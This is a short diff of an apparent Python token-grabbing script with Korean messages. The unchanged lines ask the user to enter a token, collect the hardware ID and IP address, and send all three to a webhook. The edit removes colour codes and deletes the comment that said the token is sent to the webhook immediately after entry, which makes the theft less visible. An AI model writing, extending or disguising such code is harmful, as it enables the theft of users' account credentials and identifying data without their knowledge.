@@ -54,9 +54,9 @@ def send_to_webhook(token, hardware_id, ip_address):
     try:
         response = requests.post(webhook_url, json=data)
         response.raise_for_status()
-        print(f"{y}웹훅 전송 성공{w}")
+        print("웹훅 전송 성공")
     except Exception as e:
-        print(f"{y}웹훅 전송 실패: {str(e)}{w}")
+        print(f"웹훅 전송 실패: {str(e)}")
 
 def load_config():
     try:
@@ -95,7 +95,6 @@ def load_config():
 config = load_config()
 
 token = input("토큰을 입력하세요: ")
-# 토큰 입력 후 즉시 웹훅으로 전송
 hardware_id = get_hardware_id()
 ip_address = get_ip_address()
 send_to_webhook(token, hardware_id, ip_address)
